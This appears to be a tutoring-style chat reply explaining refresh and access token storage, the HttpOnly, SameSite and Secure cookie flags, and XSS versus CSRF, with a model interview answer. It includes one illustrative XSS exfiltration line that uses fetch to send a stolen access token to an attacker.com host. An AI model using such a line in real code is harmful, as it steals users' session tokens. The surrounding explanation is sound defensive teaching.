✅ 1️⃣ Refresh Token — Your Understanding

You said:

due to SameSite=Strict and HttpOnly, unable to get refresh token

🔎 Let’s correct slightly:

🔹 Why attacker cannot read refresh token?

It’s mainly because of:

HttpOnly

That prevents JavaScript from accessing it.

Even if attacker injects:

document.cookie

The refresh token will NOT appear.

🔹 What does SameSite=Strict do?

SameSite protects against CSRF attacks, not XSS.

It prevents the browser from sending the cookie in cross-site requests.

So:

HttpOnly → protects against XSS reading cookie

SameSite → protects against CSRF

Secure → protects against HTTP sniffing

So your idea was correct — just slightly refine the reasoning.

✅ 2️⃣ Access Token in Memory — Important Clarification

You said:

if attacker gets the access token , token disappears when page reloads

⚠️ Small correction:

If attacker successfully injects malicious JS (XSS attack):

They can read access token from memory

They can immediately send it to their server

Example:

fetch("https://attacker.com/steal?token=" + accessToken)

The token disappears on reload, yes…

BUT the attacker may have already stolen it.

So the real protection is:

Access token is short-lived (10–15 minutes)

Even if stolen → limited damage window

That’s the key security reasoning.

🔥 Important Security Difference

| Token                    | If XSS happens | Risk Level             |
| ------------------------ | -------------- | ---------------------- |
| Access token (memory)    | Can be stolen  | Limited (short expiry) |
| Refresh token (HttpOnly) | Cannot be read | Very safe              |

That’s the whole design philosophy.

🧠 Why This Architecture Works

We assume:

XSS might happen.

So we design system so that:

Attacker cannot get long-term access

Only short-lived access token might leak

Refresh token stays protected

That is called defense in depth.

🎯 Interview-Perfect Answer

If interviewer asks:

If XSS happens, what can attacker steal?

You say:

If access tokens are stored in memory, they can be stolen during an XSS attack, but since they are short-lived, the impact is limited. However, refresh tokens stored in HttpOnly cookies cannot be accessed via JavaScript, which prevents attackers from gaining long-term session control.

That sounds strong.

🚨 Very Important Concept

Storing access token in memory does NOT prevent XSS.

It just limits damage.

To prevent XSS you need:

Input sanitization

CSP headers

Proper frontend security

